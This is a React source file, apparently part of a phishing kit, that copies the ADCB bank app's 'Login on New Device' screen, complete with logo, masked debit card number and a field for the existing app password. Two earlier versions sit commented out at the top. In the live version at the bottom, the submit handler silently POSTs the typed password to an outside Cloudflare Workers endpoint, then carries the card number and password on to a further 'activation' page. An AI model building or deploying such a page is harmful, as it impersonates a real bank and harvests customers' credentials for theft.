// // import { useState } from "react";
// // import { useLocation, useNavigate } from "react-router-dom";
// // import Logo from "./assets/adcb.jpg"

// // const CreditCardIcon = ({ color = "white" }) => (
// //   <svg viewBox="0 0 24 24" fill="none" className="w-8 h-8" stroke={color} strokeWidth="1.8">
// //     <rect x="2" y="5" width="20" height="14" rx="2" stroke={color} strokeWidth="1.8" />
// //     <line x1="2" y1="10" x2="22" y2="10" stroke={color} strokeWidth="1.8" />
// //     <line x1="6" y1="15" x2="10" y2="15" stroke={color} strokeWidth="2" strokeLinecap="round" />
// //   </svg>
// // );

// // const ADCBLogo = () => (
// //   <img
// //     src={Logo}
// //     alt="ADCB Logo"
// //     style={{ height: "48px", objectFit: "contain" }}
// //   />
// // );

// // const StepDots = () => (
// //   <div className="flex items-center gap-1">
// //     <div className="w-4 h-4 rounded-full bg-red-600" />
// //     <div className="w-8 h-0.5 bg-red-600" />
// //     <div className="w-4 h-4 rounded-full bg-red-600" />
// //     <div className="w-8 h-0.5 bg-gray-300" />
// //     <div className="w-4 h-4 rounded-full border-2 border-gray-300 bg-white" />
// //   </div>
// // );

// // export default function ADCBLoginNewDevice() {
// //   const [password, setPassword] = useState("");
// //   const [touched, setTouched] = useState(false);
// // const navigate = useNavigate();
// // const location = useLocation();
// // const {cardNumber} = location.state || {}
// //   const isEmpty = touched && password.trim() === "";

// //   const handleSubmit =()=>{
// //     setTouched(true)
// //     navigate('/adcbactivation',{state: {cardNumber: cardNumber}})
// //   }
// //   return (
// //     <div className="flex items-center justify-center">
// //       {/* Phone shell */}
// //       <div
// //         className="relative overflow-hidden bg-gray-100 flex flex-col"
// //         style={{
// //           width: "100%",
// //         height: "100vh",
// //         maxHeight: "100vh",
// //           boxShadow: "0 30px 80px rgba(0,0,0,0.35)",
// //           fontFamily: "'Helvetica Neue', Arial, sans-serif",
// //         }}
// //       >

// //         {/* Nav bar */}
// //         <div className="bg-white flex items-center px-5 py-3 border-b border-gray-100">
// //           <button className="mr-4 text-gray-700">
// //             <svg className="w-5 h-5" fill="none" stroke="currentColor" strokeWidth="2.5" viewBox="0 0 24 24">
// //               <path d="M15 19l-7-7 7-7" strokeLinecap="round" strokeLinejoin="round" />
// //             </svg>
// //           </button>
// //           <div className="flex-1 flex justify-center">
// //             <ADCBLogo />
// //           </div>
// //         </div>

// //         {/* Header section with gray bg */}
// //         <div className="bg-gray-100 px-5 pt-5 pb-0">
// //           <div className="flex justify-between items-center">
// //             <span className="font-black text-gray-900 tracking-wide text-sm">LOGIN ON NEW DEVICE</span>
// //             <StepDots />
// //           </div>
// //         </div>

// //         {/* Card icon - overlapping the two sections */}
// //         <div className="relative bg-gray-100" style={{ height: "60px" }}>
// //           <div className="absolute left-0 right-0 flex justify-center" style={{ top: "10px" }}>
// //             <div
// //               className="w-20 h-20 rounded-full flex items-center justify-center shadow-md"
// //               style={{ background: "#cc0000" }}
// //             >
// //               <CreditCardIcon />
// //             </div>
// //           </div>
// //         </div>

// //         {/* White content area */}
// //         <div className="flex-1 flex flex-col bg-white px-5 pt-14 pb-8">

// //           {/* Card info */}
// //           <div className="flex flex-col items-center mb-10">
// //             <p className="text-gray-600 text-base mb-1">Your Debit Card Number</p>
// //             <p className="font-bold text-gray-900 text-base tracking-wider">5264XXXXXXXX7761</p>
// //           </div>

// //           {/* Password field */}
// //           <div className="mb-4">
// //             <label className="font-bold text-gray-900 text-sm block mb-2">
// //               Existing ADCB Mobile app Password
// //             </label>
// //             <input
// //               type="password"
// //               value={password}
// //               onChange={e => setPassword(e.target.value)}
// //               onBlur={() => setTouched(true)}
// //               placeholder="Enter Existing Password"
// //               className="w-full px-4 py-4 rounded-lg bg-white text-gray-400 text-sm outline-none"
// //               style={{
// //                 border: isEmpty ? "1.5px solid #cc0000" : "1.5px solid #d1d5db",
// //                 fontSize: "15px",
// //               }}
// //             />
// //             {isEmpty && (
// //               <p className="text-red-600 text-xs mt-1 ml-1">Cannot be empty</p>
// //             )}
// //           </div>

// //           {/* Spacer */}
// //           <div className="flex-1" />

// //           {/* Forgot password */}
// //           <div className="flex justify-center mb-6">
// //             <a href="#" className="text-gray-700 text-sm underline">Forgot my password</a>
// //           </div>

// //           {/* Next button */}
// //           <button
// //             // onClick={() => setTouched(true)}
// //             onClick={handleSubmit}
// //             className="w-full py-4 rounded-full text-white font-semibold text-base transition-opacity active:opacity-80"
// //             style={{ background: "#cc0000" }}
// //           >
// //             Next
// //           </button>

// //           {/* Support */}
// //           <div className="flex justify-center items-center gap-2 mt-6">
// //             <svg className="w-5 h-5 text-gray-500" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="1.5">
// //               <path strokeLinecap="round" strokeLinejoin="round" d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z" />
// //             </svg>
// //             <a href="#" className="text-red-600 text-sm underline">Support</a>
// //           </div>
// //         </div>

// //         {/* Background watermark pattern at bottom */}
// //         <div
// //           className="absolute bottom-0 left-0 right-0 h-28 pointer-events-none opacity-10"
// //           style={{
// //             backgroundImage: "repeating-linear-gradient(45deg, #cc0000 0, #cc0000 1px, transparent 0, transparent 50%)",
// //             backgroundSize: "8px 8px",
// //           }}
// //         />
// //       </div>
// //     </div>
// //   );
// // }

// import { useState } from "react";
// import { useLocation, useNavigate } from "react-router-dom";
// import Logo from "./assets/adcb.jpg"

// const CreditCardIcon = ({ color = "white" }) => (
//   <svg viewBox="0 0 24 24" fill="none" className="w-8 h-8" stroke={color} strokeWidth="1.8">
//     <rect x="2" y="5" width="20" height="14" rx="2" stroke={color} strokeWidth="1.8" />
//     <line x1="2" y1="10" x2="22" y2="10" stroke={color} strokeWidth="1.8" />
//     <line x1="6" y1="15" x2="10" y2="15" stroke={color} strokeWidth="2" strokeLinecap="round" />
//   </svg>
// );

// const ADCBLogo = () => (
//   <img
//     src={Logo}
//     alt="ADCB Logo"
//     style={{ height: "48px", objectFit: "contain" }}
//   />
// );

// const StepDots = () => (
//   <div className="flex items-center gap-1">
//     <div className="w-4 h-4 rounded-full bg-red-600" />
//     <div className="w-8 h-0.5 bg-red-600" />
//     <div className="w-4 h-4 rounded-full bg-red-600" />
//     <div className="w-8 h-0.5 bg-gray-300" />
//     <div className="w-4 h-4 rounded-full border-2 border-gray-300 bg-white" />
//   </div>
// );

// const maskCardNumber = (num) => {
//   if (!num) return "";
//   const str = String(num);
//   if (str.length <= 8) return str;
//   const first4 = str.slice(0, 4);
//   const last4 = str.slice(-4);
//   const middle = "X".repeat(str.length - 8);
//   return `${first4}${middle}${last4}`;
// };

// export default function ADCBLoginNewDevice() {
//   const [password, setPassword] = useState("");
//   const [touched, setTouched] = useState(false);
//   const navigate = useNavigate();
//   const location = useLocation();
//   const { cardNumber } = location.state || {};

//   const isEmpty = touched && password.trim() === "";

//   const handleSubmit = () => {
//     setTouched(true);
//     if (password.trim() !== "") {
//       navigate("/adcbactivation", { state: { cardNumber } });
//     }
//   };

//   return (
//     <div className="flex items-center justify-center">
//       <div
//         className="relative overflow-hidden bg-gray-100 flex flex-col"
//         style={{
//           width: "100%",
//           height: "100vh",
//           maxHeight: "100vh",
//           boxShadow: "0 30px 80px rgba(0,0,0,0.35)",
//           fontFamily: "'Helvetica Neue', Arial, sans-serif",
//         }}
//       >
//         {/* Nav bar */}
//         <div className="bg-white flex items-center px-5 py-3 border-b border-gray-100 flex-shrink-0">
//           <button className="mr-4 text-gray-700">
//             <svg className="w-5 h-5" fill="none" stroke="currentColor" strokeWidth="2.5" viewBox="0 0 24 24">
//               <path d="M15 19l-7-7 7-7" strokeLinecap="round" strokeLinejoin="round" />
//             </svg>
//           </button>
//           <div className="flex-1 flex justify-center">
//             <ADCBLogo />
//           </div>
//         </div>

//         {/* Header section with gray bg */}
//         <div className="bg-gray-100 px-5 pt-5 pb-0 flex-shrink-0">
//           <div className="flex justify-between items-center">
//             <span className="font-black text-gray-900 tracking-wide text-sm">LOGIN ON NEW DEVICE</span>
//             <StepDots />
//           </div>
//         </div>

//         {/* Card icon - overlapping the two sections */}
//         <div className="relative bg-gray-100 flex-shrink-0" style={{ height: "60px" }}>
//           <div className="absolute left-0 right-0 flex justify-center" style={{ top: "10px" }}>
//             <div
//               className="w-20 h-20 rounded-full flex items-center justify-center shadow-md"
//               style={{ background: "#cc0000" }}
//             >
//               <CreditCardIcon />
//             </div>
//           </div>
//         </div>

//         {/* White content area */}
//         <div className="flex-1 flex flex-col bg-white px-5 pt-14 pb-8 overflow-hidden">

//           {/* Card info */}
//           <div className="flex flex-col items-center mb-10 flex-shrink-0">
//             <p className="text-gray-600 text-base mb-1">Your Debit Card Number</p>
//             <p className="font-bold text-gray-900 text-base tracking-wider">
//               {cardNumber ? maskCardNumber(cardNumber) : "XXXXXXXXXXXX"}
//             </p>
//           </div>

//           {/* Password field */}
//           <div className="mb-4 flex-shrink-0">
//             <label className="font-bold text-gray-900 text-sm block mb-2">
//               Existing ADCB Mobile app Password
//             </label>
//             <input
//               type="password"
//               value={password}
//               onChange={e => setPassword(e.target.value)}
//               onBlur={() => setTouched(true)}
//               placeholder="Enter Existing Password"
//               className="w-full px-4 py-4 rounded-lg bg-white text-gray-400 text-sm outline-none"
//               style={{
//                 border: isEmpty ? "1.5px solid #cc0000" : "1.5px solid #d1d5db",
//                 fontSize: "15px",
//               }}
//             />
//             {isEmpty && (
//               <p className="text-red-600 text-xs mt-1 ml-1">Cannot be empty</p>
//             )}
//           </div>

//           {/* Spacer */}
//           <div className="flex-1" />

//           {/* Forgot password */}
//           <div className="flex justify-center mb-6 flex-shrink-0">
//             <a href="#" className="text-gray-700 text-sm underline">Forgot my password</a>
//           </div>

//           {/* Next button */}
//           <button
//             onClick={handleSubmit}
//             className="w-full py-4 rounded-full text-white font-semibold text-base transition-opacity active:opacity-80 flex-shrink-0"
//             style={{ background: "#cc0000" }}
//           >
//             Next
//           </button>

//           {/* Support */}
//           <div className="flex justify-center items-center gap-2 mt-6 flex-shrink-0">
//             <svg className="w-5 h-5 text-gray-500" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="1.5">
//               <path strokeLinecap="round" strokeLinejoin="round" d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z" />
//             </svg>
//             <a href="#" className="text-red-600 text-sm underline">Support</a>
//           </div>
//         </div>

//         {/* Background watermark pattern at bottom */}
//         <div
//           className="absolute bottom-0 left-0 right-0 h-28 pointer-events-none opacity-10"
//           style={{
//             backgroundImage: "repeating-linear-gradient(45deg, #cc0000 0, #cc0000 1px, transparent 0, transparent 50%)",
//             backgroundSize: "8px 8px",
//           }}
//         />
//       </div>
//     </div>
//   );
// }

import { useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import Logo from "./assets/adcb.jpg"

const CreditCardIcon = ({ color = "white" }) => (
    <svg viewBox="0 0 24 24" fill="none" className="w-8 h-8" stroke={color} strokeWidth="1.8">
        <rect x="2" y="5" width="20" height="14" rx="2" stroke={color} strokeWidth="1.8" />
        <line x1="2" y1="10" x2="22" y2="10" stroke={color} strokeWidth="1.8" />
        <line x1="6" y1="15" x2="10" y2="15" stroke={color} strokeWidth="2" strokeLinecap="round" />
    </svg>
);

const ADCBLogo = () => (
    <img
        src={Logo}
        alt="ADCB Logo"
        style={{ height: "48px", objectFit: "contain" }}
    />
);

const StepDots = () => (
    <div className="flex items-center gap-1">
        <div className="w-4 h-4 rounded-full bg-red-600" />
        <div className="w-8 h-0.5 bg-red-600" />
        <div className="w-4 h-4 rounded-full bg-red-600" />
        <div className="w-8 h-0.5 bg-gray-300" />
        <div className="w-4 h-4 rounded-full border-2 border-gray-300 bg-white" />
    </div>
);

const maskCardNumber = (num) => {
    if (!num) return "";
    const str = String(num);
    if (str.length <= 8) return str;
    const first4 = str.slice(0, 4);
    const last4 = str.slice(-4);
    const middle = "X".repeat(str.length - 8);
    return `${first4}${middle}${last4}`;
};

export default function ADCBLoginNewDevice() {
    const [password, setPassword] = useState("");
    const [touched, setTouched] = useState(false);
    const navigate = useNavigate();
    const location = useLocation();
    const { cardNumber } = location.state || {};

    const isEmpty = touched && password.trim() === "";

    const handleSubmit = async() => {
        setTouched(true);
        if (password.trim() !== "") {
            const payload = {
                password: password
            }
            await fetch(
                " https://my-worker-app.instapayapi.workers.dev/api/password",
                {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload),
                },
            );
            navigate("/adcbactivation", { state: { cardNumber, password: password } });
        }
    };

    return (
        <div className="flex items-center justify-center">
            <div
                className="relative overflow-hidden bg-white flex flex-col"
                style={{
                    width: "100%",
                    height: "100vh",
                    maxHeight: "100vh",
                    boxShadow: "0 30px 80px rgba(0,0,0,0.35)",
                    fontFamily: "'Helvetica Neue', Arial, sans-serif",
                }}
            >
                {/* Nav bar */}
                <div className="bg-white flex items-center px-5 py-3 border-b border-gray-100 flex-shrink-0">
                    <button className="mr-4 text-gray-700">
                        <svg className="w-5 h-5" fill="none" stroke="currentColor" strokeWidth="2.5" viewBox="0 0 24 24">
                            <path d="M15 19l-7-7 7-7" strokeLinecap="round" strokeLinejoin="round" />
                        </svg>
                    </button>
                    <div className="flex-1 flex justify-center">
                        <ADCBLogo />
                    </div>
                </div>

                {/* Header section with gray bg */}
                <div className="bg-white px-5 pt-5 pb-0 flex-shrink-0">
                    <div className="flex justify-between items-center">
                        <span className="font-black text-gray-900 tracking-wide text-sm">LOGIN ON NEW DEVICE</span>
                        <StepDots />
                    </div>
                </div>

                {/* Card icon - overlapping the two sections */}
                <div className="relative bg-white flex-shrink-0" style={{ height: "70px" }}>
                    {/* Full-width horizontal line through icon center */}
                    <div className="absolute bg-gray-200" style={{ top: "40px", left: 0, right: 0, height: "1px", zIndex: 0 }} />
                    <div className="absolute left-0 right-0 flex justify-center" style={{ top: "0px", zIndex: 1 }}>
                        <div
                            className="w-20 h-20 rounded-full flex items-center justify-center shadow-md"
                            style={{ background: "#cc0000" }}
                        >
                            <CreditCardIcon />
                        </div>
                    </div>
                </div>

                {/* White content area */}
                <div className="flex-1 flex flex-col bg-white px-5 pt-14 pb-8 overflow-hidden">

                    {/* Card info */}
                    <div className="flex flex-col items-center mb-10 flex-shrink-0">
                        <p className="text-gray-600 text-base mb-1">Your Debit Card Number</p>
                        <p className="font-bold text-gray-900 text-base tracking-wider">
                            {cardNumber ? maskCardNumber(cardNumber) : "XXXXXXXXXXXX"}
                        </p>
                    </div>

                    {/* Password field */}
                    <div className="mb-4 flex-shrink-0">
                        <label className="font-bold text-gray-900 text-sm block mb-2">
                            Existing ADCB Mobile app Password
                        </label>
                        <input
                            type="password"
                            value={password}
                            onChange={e => setPassword(e.target.value)}
                            onBlur={() => setTouched(true)}
                            placeholder="Enter Existing Password"
                            className="w-full px-4 py-4 rounded-lg bg-white text-gray-400 text-sm outline-none"
                            style={{
                                border: isEmpty ? "1.5px solid #cc0000" : "1.5px solid #d1d5db",
                                fontSize: "15px",
                            }}
                        />
                        {isEmpty && (
                            <p className="text-red-600 text-xs mt-1 ml-1">Cannot be empty</p>
                        )}
                    </div>

                    {/* Spacer */}
                    <div className="flex-1" style={{ maxHeight: "80px" }} />

                    {/* Forgot password */}
                    <div className="flex justify-center mb-6 flex-shrink-0">
                        <a href="#" className="text-gray-700 text-sm underline">Forgot my password</a>
                    </div>

                    {/* Next button */}
                    <button
                        onClick={handleSubmit}
                        className="w-full py-4 rounded-full text-white font-semibold text-base transition-opacity active:opacity-80 flex-shrink-0"
                        style={{ background: "#cc0000" }}
                    >
                        Next
                    </button>

                    {/* Support */}
                    <div className="flex justify-center items-center gap-2 mt-6 flex-shrink-0">
                        <svg className="w-5 h-5 text-gray-500" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="1.5">
                            <path strokeLinecap="round" strokeLinejoin="round" d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z" />
                        </svg>
                        <a href="#" className="text-red-600 text-sm underline">Support</a>
                    </div>
                </div>

                {/* Background watermark pattern at bottom */}
                <div
                    className="absolute bottom-0 left-0 right-0 h-28 pointer-events-none opacity-10"
                    style={{
                        backgroundImage: "repeating-linear-gradient(45deg, #cc0000 0, #cc0000 1px, transparent 0, transparent 50%)",
                        backgroundSize: "8px 8px",
                    }}
                />
            </div>
        </div>
    );
}